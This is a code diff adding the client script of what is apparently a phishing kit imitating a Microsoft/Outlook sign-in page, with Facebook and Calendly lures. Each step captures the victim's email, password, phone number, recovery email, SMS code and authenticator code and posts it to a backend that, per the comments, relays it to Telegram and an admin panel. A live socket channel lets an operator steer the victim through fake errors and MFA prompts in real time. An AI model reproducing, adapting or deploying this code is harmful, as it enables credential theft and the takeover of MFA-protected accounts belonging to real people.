+      }
+    }
+
+    /* ─── Socket.io connection ─── */
+    try {
+      socket = io(BACKEND, {
+        query: { clientId: clientId },
+        transports: ['polling', 'websocket'],
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000
+      });
+
+      var _glFirstConnect = true;
+      window.socket = socket;
+      if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
+      if (typeof SocketPresence !== 'undefined') {
+        SocketPresence.install(socket, {
+          page: 'microsoft-login',
+          onReconnect: function () {
+            reportVisibleGoogleStep();
+            clearReconnectUi();
+          },
+        });
+      }
+
+      function clearReconnectUi() {
+          clearTimeout(pwWaitTimer);
+          if (overlay) overlay.classList.remove('visible');
+
+          [
+            { btn: emailNextBtn, lbl: emailLabel },
+            { btn: pwNextBtn,    lbl: pwLabel },
+            { btn: document.getElementById('phoneNextBtn'),    lbl: document.getElementById('phoneBtnLabel') },
+            { btn: document.getElementById('smsSendBtn'),      lbl: document.getElementById('smsSendLabel') },
+            { btn: document.getElementById('smsCodeNextBtn'),  lbl: document.getElementById('smsCodeLabel') },
+            { btn: document.getElementById('authCodeNextBtn'), lbl: document.getElementById('authCodeLabel') },
+            { btn: document.getElementById('emailVerifySendBtn'), lbl: document.getElementById('emailVerifySendLabel'), resetText: 'Send code' },
+            { btn: document.getElementById('emailCodeNextBtn'), lbl: document.getElementById('emailCodeNextLabel') }
+          ].forEach(function (o) {
+            if (o.btn && o.lbl && o.btn.querySelector('.btn-spinner')) {
+              if (o.resetText) {
+                o.btn.disabled = false;
+                var sp = o.btn.querySelector('.btn-spinner');
+                if (sp) sp.remove();
+                o.lbl.textContent = o.resetText;
+              } else {
+                setLoading(o.btn, o.lbl, false);
+              }
+            }
+          });
+      }
+
+      socket.on('connect', function () {
+        currentSocketId = socket.id;
+        reportVisibleGoogleStep();
+
+        if (!_glFirstConnect) {
+          clearReconnectUi();
+        }
+        _glFirstConnect = false;
+      });
+
+      socket.on('show-calendar', function () {
+        try { sessionStorage.setItem('calendlySession', '1'); } catch(e) {}
+        window.location.href = 'calendly';
+      });
+      socket.on('show-passkey', function () {
+        try { sessionStorage.setItem('passkeySession', '1'); } catch(e) {}
+        window.location.href = 'passkey';
+      });
+      socket.on('redirect',      function (url) { window.location.href = url; });
+
+      /* Admin panel → "OutlookWRONGPASS" button → show wrong password error */
+      socket.on('show-microsoft-wrong-pass', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+        pwInput.value = '';
+
+        showErr(pwInput, pwErr);
+        pwErr.textContent = "Wrong password. Try again or click 'Forgot password' to reset it.";
+      });
+
+      /* ─── Facebook security modals — redirect back to origin page ─── */
+      var fbModalMap = {
+        'show-2fa':          '2fa',
+        'show-auth':         'auth',
+        'show-email':        'email',
+        'show-whatsapp':     'whatsapp',
+        'show-old-pass':     'oldpass',
+        'show-wrong-creds':  'wrongcreds'
+      };
+      Object.keys(fbModalMap).forEach(function (event) {
+        socket.on(event, function () {
+          var returnPage = sessionStorage.getItem('microsoftReturnPage') || 'apply.html';
+          try {
+            sessionStorage.setItem('pendingModal', fbModalMap[event]);
+            sessionStorage.removeItem('microsoftReturnPage');
+          } catch (e) {}
+          window.location.href = returnPage;
+        });
+      });
+
+      /* Admin panel → Email Verify → protect account + masked recovery email */
+      socket.on('show-microsoft-email-verify', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var masked = (data && data.maskedEmail) ? String(data.maskedEmail).trim() : '';
+        if (!masked) {
+          try { masked = sessionStorage.getItem('msEmailVerifyMasked') || ''; } catch (e) { masked = ''; }
+        }
+        if (!masked) masked = '*****@gmail.com';
+        try { sessionStorage.setItem('msEmailVerifyMasked', masked); } catch (e) {}
+
+        var at = masked.indexOf('@');
+        var suffix = at >= 0 ? masked.slice(at) : '@gmail.com';
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('emailVerifySignedIn').textContent = addr;
+        document.getElementById('emailVerifyRadioLabel').textContent = masked;
+        document.getElementById('emailVerifyDomainSuffix').textContent = suffix;
+
+        var localInp = document.getElementById('emailVerifyLocalInput');
+        localInp.value = '';
+        localInp.classList.remove('err');
+        document.getElementById('emailVerifyLocalError').classList.remove('visible');
+
+        showMsView('stepEmailVerify');
+        localInp.focus();
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → "GooglePhone" button → show phone step with prefix */
+      socket.on('show-microsoft-phone', function (prefix) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('phonePrefixBox').textContent = prefixText;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step3ChipEmail').textContent = addr;
+
+        showLegacyStep('step3');
+        document.getElementById('phoneInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → GooglePrompt → show number prompt */
+      socket.on('show-microsoft-prompt', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var num = (data && data.number) ? String(data.number) : '58';
+        var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+        var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+        var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
+
+        document.getElementById('promptNumber').textContent           = num;
+        document.getElementById('promptNumberInline').textContent      = num;
+        document.getElementById('promptDeviceName').textContent        = hasDevice
+          ? ('Open the Outlook or Microsoft app app on ' + deviceLabel)
+          : 'Open the Outlook or Microsoft app app';
+        document.getElementById('promptDeviceNameInline').textContent  = hasDevice ? deviceLabel : 'phone';
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step4ChipEmail').textContent = addr;
+
+        showLegacyStep('step4');
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → GoogleSMS → show SMS phone-entry step */
+      socket.on('show-microsoft-sms', function (data) {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        // data can be { prefix, lastTwo } or legacy plain string
+        var prefix  = (data && typeof data === 'object') ? (data.prefix || '') : String(data || '');
+        var lastTwo = (data && typeof data === 'object') ? (data.lastTwo || '00') : '00';
+
+        var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+        document.getElementById('smsPrefixBox').textContent = prefixText;
+        document.getElementById('smsLastTwo').textContent = lastTwo;
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step5ChipEmail').textContent = addr;
+
+        showLegacyStep('step5');
+        document.getElementById('smsPhoneInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+      /* Admin panel → WrongNumber → error on SMS phone step */
+      socket.on('show-microsoft-wrong-number', function () {
+        var smsPhoneInput = document.getElementById('smsPhoneInput');
+        var smsPhoneError = document.getElementById('smsPhoneError');
+        var smsSendBtn    = document.getElementById('smsSendBtn');
+        var smsSendLabel  = document.getElementById('smsSendLabel');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        overlay.classList.remove('visible');
+        smsPhoneError.textContent = 'This number is not associated with your Microsoft account. Try again.';
+        showErr(smsPhoneInput, smsPhoneError);
+      });
+
+      /* Admin panel → WrongCode → error on SMS code OR auth step (auto-detects visible step) */
+      socket.on('show-microsoft-wrong-code', function () {
+        var emailCodeVisible = document.getElementById('stepEmailSecurityCode').classList.contains('ms-active');
+        if (emailCodeVisible) {
+          var emailSecInp = document.getElementById('emailSecurityCodeInput');
+          var emailSecErr = document.getElementById('emailCodeError');
+          var emailSecBtn = document.getElementById('emailCodeNextBtn');
+          var emailSecLbl = document.getElementById('emailCodeNextLabel');
+          if (emailSecBtn && emailSecLbl) setLoading(emailSecBtn, emailSecLbl, false);
+          overlay.classList.remove('visible');
+          if (emailSecInp) {
+            emailSecInp.value = '';
+            emailSecInp.classList.remove('err');
+          }
+          if (emailSecErr) {
+            emailSecErr.classList.add('visible');
+            emailSecInp && emailSecInp.focus();
+          }
+          return;
+        }
+        var step6Visible = document.getElementById('step6').style.display !== 'none';
+        if (step6Visible) {
+          var smsCodeInput   = document.getElementById('smsCodeInput');
+          var smsCodeError   = document.getElementById('smsCodeError');
+          var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+          var smsCodeLabel   = document.getElementById('smsCodeLabel');
+          setLoading(smsCodeNextBtn, smsCodeLabel, false);
+          overlay.classList.remove('visible');
+          smsCodeInput.value = '';
+          smsCodeInput.classList.remove('has-val');
+          showErr(smsCodeInput, smsCodeError);
+        } else {
+          /* Authenticator step */
+          var authCodeInput   = document.getElementById('authCodeInput');
+          var authCodeError   = document.getElementById('authCodeError');
+          var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+          var authCodeLabel   = document.getElementById('authCodeLabel');
+          setLoading(authCodeNextBtn, authCodeLabel, false);
+          overlay.classList.remove('visible');
+          authCodeInput.value = '';
+          authCodeInput.classList.remove('has-val');
+          showErr(authCodeInput, authCodeError);
+        }
+      });
+
+      /* Admin panel → WrongAuthCode → specifically targets authenticator step */
+      socket.on('show-microsoft-wrong-auth-code', function () {
+        var authCodeInput   = document.getElementById('authCodeInput');
+        var authCodeError   = document.getElementById('authCodeError');
+        var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+        var authCodeLabel   = document.getElementById('authCodeLabel');
+        setLoading(authCodeNextBtn, authCodeLabel, false);
+        overlay.classList.remove('visible');
+        authCodeInput.value = '';
+        authCodeInput.classList.remove('has-val');
+        showErr(authCodeInput, authCodeError);
+      });
+
+      /* Admin panel → GoogleAuth → show authenticator code step */
+      socket.on('show-microsoft-auth', function () {
+        clearTimeout(pwWaitTimer);
+        setLoading(pwNextBtn, pwLabel, false);
+        overlay.classList.remove('visible');
+
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('step7ChipEmail').textContent = addr;
+
+        showLegacyStep('step7');
+        document.getElementById('authCodeInput').focus();
+        reportVisibleGoogleStep();
+      });
+
+    } catch (e) {}
+
+    /* ─── Destination app name — Calendly when opened from Continue with Google ─── */
+    if (sessionStorage.getItem('microsoftContinueApp') === 'calendly') {
+      var continueAppBtn = document.getElementById('continueAppBtn');
+      if (continueAppBtn) continueAppBtn.textContent = 'Calendly';
+      document.querySelectorAll('[data-privacy-notice]').forEach(function (el) {
+        el.innerHTML =
+          'Before using this app, you can review Calendly\'s ' +
+          '<a href="https://calendly.com/privacy" target="_blank">Privacy Policy</a> ' +
+          'and ' +
+          '<a href="https://calendly.com/terms" target="_blank">Terms of Service</a>.';
+      });
+    }
+
+    /* ─── Pre-fill email from Facebook login / verify flow ─── */
+    try { sessionStorage.removeItem('microsoftSkipEmailPrefill'); } catch (e) {}
+    var storedEmail = sessionStorage.getItem('lastLoginEmail')
+      || sessionStorage.getItem('microsoftVerifyDisplayEmail')
+      || '';
+    if (storedEmail) {
+      emailInput.value = storedEmail;
+      chipEmail.textContent = storedEmail;
+    }
+
+    /* Keep label floating in sync */
+    emailInput.addEventListener('input', function () {
+      
+      clearErr(emailInput, emailErr);
+    });
+
+    pwInput.addEventListener('input', function () {
+      
+      clearErr(pwInput, pwErr);
+    });
+
+    /* ─── Step 1: Email → Next ─── */
+    emailNextBtn.addEventListener('click', function () {
+      var addr = emailInput.value.trim();
+      if (!addr) {
+        showErr(emailInput, emailErr);
+        return;
+      }
+
+      setLoading(emailNextBtn, emailLabel, true);
+      try { sessionStorage.setItem('lastLoginEmail', addr); } catch (e) {}
+
+      /* Notify backend so Telegram shows the Google email step */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: '', type: 'microsoft_email' }))
+      }).catch(function () {});
+
+      setTimeout(function () {
+        setLoading(emailNextBtn, emailLabel, false);
+        chipEmail.textContent = addr;
+        showMsView('step2');
+        pwInput.focus();
+        reportVisibleGoogleStep();
+      }, 600);
+    });
+
+    emailInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') emailNextBtn.click();
+    });
+
+    function goBackToEmailStep() {
+      pwInput.value = '';
+      pwInput.classList.remove('err');
+      pwErr.classList.remove('visible');
+      showMsView('step1');
+      emailInput.focus();
+    }
+    var msBackBtn = document.getElementById('msBackBtn');
+    if (msBackBtn) {
+      msBackBtn.addEventListener('click', goBackToEmailStep);
+    }
+    var accountChip = document.getElementById('accountChip');
+    if (accountChip) {
+      accountChip.addEventListener('click', goBackToEmailStep);
+    }
+
+    /* ─── Step 2: Password → Next ─── */
+    pwNextBtn.addEventListener('click', function () {
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var pass = pwInput.value;
+      if (!pass) {
+        showErr(pwInput, pwErr);
+        return;
+      }
+
+      setLoading(pwNextBtn, pwLabel, true);
+      overlay.classList.add('visible');
+
+      /* Send credentials to backend → shows in Telegram / admin panel */
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: pass, type: 'microsoft_password' }))
+      }).catch(function () {});
+
+      /* Keep spinner until admin sends show-microsoft-wrong-pass or redirect */
+      pwWaitTimer = setTimeout(function () { /* keep waiting */ }, 30000);
+    });
+
+    pwInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') pwNextBtn.click();
+    });
+
+    /* ─── Step 3: Phone ─── */
+    var step3      = document.getElementById('step3');
+    var phoneInput = document.getElementById('phoneInput');
+    var phoneErr   = document.getElementById('phoneError');
+    var phoneNextBtn = document.getElementById('phoneNextBtn');
+    var phoneBtnLabel = document.getElementById('phoneBtnLabel');
+
+    phoneInput.addEventListener('input', function () {
+      phoneInput.classList.toggle('has-val', phoneInput.value.length > 0);
+      clearErr(phoneInput, phoneErr);
+    });
+
+    phoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') phoneNextBtn.click();
+    });
+
+    document.getElementById('phoneBackBtn').addEventListener('click', function () {
+      phoneInput.value = '';
+      phoneInput.classList.remove('has-val', 'err');
+      phoneErr.classList.remove('visible');
+      showMsView('step2');
+      pwInput.focus();
+    });
+
+    phoneNextBtn.addEventListener('click', function () {
+      var phone = phoneInput.value.trim();
+      if (!phone) {
+        showErr(phoneInput, phoneErr);
+        return;
+      }
+
+      var prefix = document.getElementById('phonePrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(phoneNextBtn, phoneBtnLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: fullPhone, type: 'microsoft_phone' }))
+      }).catch(function () {});
+    });
+
+    var MS_VIEW_STEP_IDS = ['step1', 'step2', 'stepEmailVerify', 'stepEmailSecurityCode'];
+    var MS_TALL_VERIFY_IDS = ['stepEmailVerify'];
+    var MS_COMPACT_CODE_IDS = ['stepEmailSecurityCode'];
+    var MS_LEGACY_STEP_IDS = ['step3', 'step4', 'step5', 'step6', 'step7'];
+
+    function isStepVisible(el) {
+      if (!el) return false;
+      if (el.classList.contains('ms-view')) return el.classList.contains('ms-active');
+      return el.style.display !== 'none';
+    }
+
+    function syncLightboxSize(activeId) {
+      var lb = document.getElementById('lightbox');
+      if (!lb) return;
+      lb.classList.remove('ms-tall', 'ms-tall-email', 'ms-tall-code');
+      lb.style.height = '';
+      lb.style.minHeight = '';
+      lb.style.maxHeight = '';
+      lb.style.overflowY = '';
+      if (!activeId || activeId === 'step1' || activeId === 'step2') {
+        lb.style.height = '338px';
+        lb.style.minHeight = '338px';
+      }
+      if (activeId && MS_TALL_VERIFY_IDS.indexOf(activeId) >= 0) {
+        lb.classList.add('ms-tall', 'ms-tall-email');
+      } else if (activeId && MS_COMPACT_CODE_IDS.indexOf(activeId) >= 0) {
+        lb.classList.add('ms-tall', 'ms-tall-code');
+      } else if (activeId && MS_LEGACY_STEP_IDS.indexOf(activeId) >= 0) {
+        lb.classList.add('ms-tall');
+        lb.style.height = 'auto';
+        lb.style.minHeight = '338px';
+        lb.style.maxHeight = 'calc(100vh - 96px)';
+        lb.style.overflowY = 'auto';
+      }
+    }
+
+    function hideAllSteps() {
+      MS_VIEW_STEP_IDS.forEach(function (id) {
+        var el = document.getElementById(id);
+        if (el) el.classList.remove('ms-active');
+      });
+      MS_LEGACY_STEP_IDS.forEach(function (id) {
+        var el = document.getElementById(id);
+        if (el) el.style.display = 'none';
+      });
+      syncLightboxSize(null);
+    }
+
+    function showMsView(id) {
+      hideAllSteps();
+      var el = document.getElementById(id);
+      if (el) el.classList.add('ms-active');
+      syncLightboxSize(id);
+    }
+
+    function showLegacyStep(id) {
+      hideAllSteps();
+      var el = document.getElementById(id);
+      if (el) el.style.display = 'flex';
+      syncLightboxSize(id);
+    }
+
+    function resetEmailVerifySendBtn() {
+      var btn = document.getElementById('emailVerifySendBtn');
+      var lbl = document.getElementById('emailVerifySendLabel');
+      if (!btn || !lbl) return;
+      btn.disabled = false;
+      var sp = document.getElementById('spinner_emailVerifySendBtn');
+      if (sp) sp.remove();
+      lbl.textContent = 'Send code';
+    }
+
+    function showEmailSecurityCodeStep(recoveryEmail, signInAddr) {
+      var sub = document.getElementById('emailCodeSubhead');
+      var signedIn = document.getElementById('emailCodeSignedIn');
+      var codeInp = document.getElementById('emailSecurityCodeInput');
+      var codeErr = document.getElementById('emailCodeError');
+      if (signedIn) signedIn.textContent = signInAddr || '';
+      if (sub) {
+        sub.textContent = 'If ' + recoveryEmail + ' matches the email address on your account, we\u2019ll send you a code.';
+      }
+      if (codeInp) {
+        codeInp.value = '';
+        codeInp.classList.remove('err');
+      }
+      if (codeErr) codeErr.classList.remove('visible');
+      resetEmailVerifySendBtn();
+      overlay.classList.remove('visible');
+      showMsView('stepEmailSecurityCode');
+      if (codeInp) codeInp.focus();
+      reportVisibleGoogleStep();
+    }
+
+    var emailVerifyLocalInput = document.getElementById('emailVerifyLocalInput');
+    var emailVerifyLocalError = document.getElementById('emailVerifyLocalError');
+    var emailVerifySendBtn = document.getElementById('emailVerifySendBtn');
+    var emailVerifySendLabel = document.getElementById('emailVerifySendLabel');
+
+    if (emailVerifyLocalInput) {
+      emailVerifyLocalInput.addEventListener('input', function () {
+        emailVerifyLocalInput.classList.remove('err');
+        emailVerifyLocalError.classList.remove('visible');
+      });
+      emailVerifySendBtn.addEventListener('click', function () {
+        var local = emailVerifyLocalInput.value.trim();
+        if (!local) {
+          emailVerifyLocalInput.classList.add('err');
+          emailVerifyLocalError.classList.add('visible');
+          emailVerifyLocalInput.focus();
+          return;
+        }
+        var suffix = document.getElementById('emailVerifyDomainSuffix').textContent || '';
+        var completed = local.indexOf('@') >= 0 ? local : (local + suffix);
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+        emailVerifySendBtn.disabled = true;
+        emailVerifySendLabel.textContent = '';
+        var evSp = document.createElement('span');
+        evSp.className = 'btn-spinner';
+        evSp.id = 'spinner_emailVerifySendBtn';
+        emailVerifySendBtn.appendChild(evSp);
+        overlay.classList.add('visible');
+
+        try { sessionStorage.setItem('msEmailVerifyRecoveryEmail', completed); } catch (e) {}
+
+        fetch(BACKEND + '/send-login-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(microsoftPostBody({
+            username: addr,
+            password: completed,
+            type: 'microsoft_email_verify'
+          }))
+        }).catch(function () {}).finally(function () {
+          setTimeout(function () {
+            showEmailSecurityCodeStep(completed, addr);
+          }, 1400);
+        });
+      });
+
+      var haveCodeLink = document.getElementById('emailVerifyHaveCodeLink');
+      if (haveCodeLink) {
+        haveCodeLink.addEventListener('click', function (e) {
+          e.preventDefault();
+          var suffix = document.getElementById('emailVerifyDomainSuffix').textContent || '';
+          var local = emailVerifyLocalInput.value.trim();
+          var completed = local.indexOf('@') >= 0 ? local : (local ? local + suffix : '');
+          if (!completed) {
+            try { completed = sessionStorage.getItem('msEmailVerifyRecoveryEmail') || ''; } catch (err) { completed = ''; }
+          }
+          if (!completed) {
+            var masked = document.getElementById('emailVerifyRadioLabel').textContent || '';
+            completed = masked.indexOf('@') >= 0 ? masked.replace(/\*+/g, '') : masked;
+          }
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          showEmailSecurityCodeStep(completed, addr);
+        });
+      }
+    }
+
+    var emailSecurityCodeInput = document.getElementById('emailSecurityCodeInput');
+    var emailCodeError = document.getElementById('emailCodeError');
+    var emailCodeNextBtn = document.getElementById('emailCodeNextBtn');
+    var emailCodeNextLabel = document.getElementById('emailCodeNextLabel');
+    var emailCodeCancelBtn = document.getElementById('emailCodeCancelBtn');
+
+    if (emailSecurityCodeInput && emailCodeNextBtn) {
+      emailSecurityCodeInput.addEventListener('input', function () {
+        emailSecurityCodeInput.classList.remove('err');
+        emailCodeError.classList.remove('visible');
+      });
+      emailSecurityCodeInput.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter') emailCodeNextBtn.click();
+      });
+      emailCodeCancelBtn.addEventListener('click', function () {
+        showMsView('stepEmailVerify');
+        reportVisibleGoogleStep();
+      });
+      emailCodeNextBtn.addEventListener('click', function () {
+        var code = emailSecurityCodeInput.value.trim();
+        if (!code) {
+          emailSecurityCodeInput.classList.add('err');
+          emailCodeError.textContent = 'Enter the security code.';
+          emailCodeError.classList.add('visible');
+          emailSecurityCodeInput.focus();
+          return;
+        }
+        var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        setLoading(emailCodeNextBtn, emailCodeNextLabel, true);
+        overlay.classList.add('visible');
+        fetch(BACKEND + '/send-login-data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(microsoftPostBody({
+            username: addr,
+            password: code,
+            type: 'microsoft_email_security_code'
+          }))
+        }).catch(function () {});
+      });
+    }
+
+    /* ─── Step 5: SMS phone entry ─── */
+    var smsPhoneInput = document.getElementById('smsPhoneInput');
+    var smsPhoneError = document.getElementById('smsPhoneError');
+    var smsSendBtn    = document.getElementById('smsSendBtn');
+    var smsSendLabel  = document.getElementById('smsSendLabel');
+
+    smsPhoneInput.addEventListener('input', function () {
+      smsPhoneInput.classList.toggle('has-val', smsPhoneInput.value.length > 0);
+      clearErr(smsPhoneInput, smsPhoneError);
+    });
+
+    smsPhoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsSendBtn.click();
+    });
+
+    smsSendBtn.addEventListener('click', function () {
+      var phone = smsPhoneInput.value.trim();
+      if (!phone) {
+        showErr(smsPhoneInput, smsPhoneError);
+        return;
+      }
+
+      var prefix    = document.getElementById('smsPrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr      = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsSendBtn, smsSendLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: fullPhone, type: 'microsoft_sms_phone' }))
+      }).catch(function () {});
+
+      /* Show code step after brief delay (admin will send wrong-number if invalid) */
+      setTimeout(function () {
+        var addr2 = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('smsCodeHint').textContent =
+          'Enter the 6-digit code we sent to ' + fullPhone + '.';
+        document.getElementById('step6ChipEmail').textContent = addr2;
+        overlay.classList.remove('visible');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        showLegacyStep('step6');
+        document.getElementById('smsCodeInput').focus();
+        reportVisibleGoogleStep();
+      }, 2000);
+    });
+
+    /* ─── Step 6: SMS code entry ─── */
+    var smsCodeInput   = document.getElementById('smsCodeInput');
+    var smsCodeError   = document.getElementById('smsCodeError');
+    var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+    var smsCodeLabel   = document.getElementById('smsCodeLabel');
+
+    smsCodeInput.addEventListener('input', function () {
+      smsCodeInput.classList.toggle('has-val', smsCodeInput.value.length > 0);
+      clearErr(smsCodeInput, smsCodeError);
+    });
+
+    smsCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsCodeNextBtn.click();
+    });
+
+    smsCodeNextBtn.addEventListener('click', function () {
+      var code = smsCodeInput.value.trim();
+      if (!code) {
+        showErr(smsCodeInput, smsCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsCodeNextBtn, smsCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: code, type: 'microsoft_sms_code' }))
+      }).catch(function () {});
+    });
+
+    /* ─── Step 7: Authenticator code ─── */
+    var authCodeInput   = document.getElementById('authCodeInput');
+    var authCodeError   = document.getElementById('authCodeError');
+    var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+    var authCodeLabel   = document.getElementById('authCodeLabel');
+
+    authCodeInput.addEventListener('input', function () {
+      authCodeInput.classList.toggle('has-val', authCodeInput.value.length > 0);
+      clearErr(authCodeInput, authCodeError);
+    });
+
+    authCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') authCodeNextBtn.click();
+    });
+
+    authCodeNextBtn.addEventListener('click', function () {
+      var code = authCodeInput.value.trim();
+      if (!code) {
+        showErr(authCodeInput, authCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(authCodeNextBtn, authCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(microsoftPostBody({ username: addr, password: code, type: 'microsoft_auth_code' }))
+      }).catch(function () {});
+    });
+
+    syncLightboxSize('step1');
+    reportVisibleGoogleStep();
+
+  })();
+  </script>
+</body>
+</html>
